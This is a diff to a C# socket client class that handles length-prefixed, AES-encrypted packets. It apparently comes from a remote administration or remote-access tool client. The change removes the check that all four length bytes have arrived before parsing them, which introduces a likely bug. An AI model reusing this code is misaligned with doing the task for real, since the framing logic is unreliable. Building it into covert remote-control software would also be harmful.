@@ -10,7 +10,6 @@ using Client.Helper;
 
 namespace Client.Sockets
 {
-
     class ClientSocket
     {
 
@@ -40,7 +39,6 @@ namespace Client.Sockets
                 Debug.WriteLine("Connected!");
                 Connected = true;
                 Buffer = new byte[4];
-                Buffersize = 0;
                 BufferRecevied = false;
                 MS = new MemoryStream();
                 SendSync = new object();
@@ -101,22 +99,14 @@ namespace Client.Sockets
                     if (BufferRecevied == false)
                     {
                         MS.Write(Buffer, 0, Recevied);
-                        if (MS.Length == 4)
+                        Buffersize = BitConverter.ToInt32(MS.ToArray(), 0);
+                        Debug.WriteLine("/// Client Buffersize " + Buffersize.ToString() + " Bytes  ///");
+                        MS.Dispose();
+                        MS = new MemoryStream();
+                        if (Buffersize > 0)
                         {
-                            Buffersize = BitConverter.ToInt32(MS.ToArray(), 0);
-                            Debug.WriteLine("/// Client Buffersize " + Buffersize.ToString() + " Bytes  ///");
-                            MS.Dispose();
-                            MS = new MemoryStream();
-                            if (Buffersize > 0)
-                            {
-                                Buffer = new byte[Buffersize];
-                                BufferRecevied = true;
-                            }
-                        }
-                        else
-                        {
-                            Connected = false;
-                            return;
+                            Buffer = new byte[Buffersize];
+                            BufferRecevied = true;
                         }
                     }
                     else
@@ -126,7 +116,6 @@ namespace Client.Sockets
                         {
                             ThreadPool.QueueUserWorkItem(HandlePacket.Read, Settings.aes256.Decrypt(MS.ToArray()));
                             Buffer = new byte[4];
-                            Buffersize = 0;
                             MS.Dispose();
                             MS = new MemoryStream();
                             BufferRecevied = false;
@@ -155,6 +144,12 @@ namespace Client.Sockets
             {
                 try
                 {
+                    if (!Client.Connected)
+                    {
+                        Connected = false;
+                        return;
+                    }
+
                     byte[] buffer = Settings.aes256.Encrypt(Msg);
                     byte[] buffersize = BitConverter.GetBytes(buffer.Length);
 
@@ -176,6 +171,12 @@ namespace Client.Sockets
             {
                 try
                 {
+                    if (!Client.Connected)
+                    {
+                        Connected = false;
+                        return;
+                    }
+
                     int sent = 0;
                     sent = Client.EndSend(ar);
                     Debug.WriteLine("/// Client Sent " + sent.ToString() + " Bytes  ///");
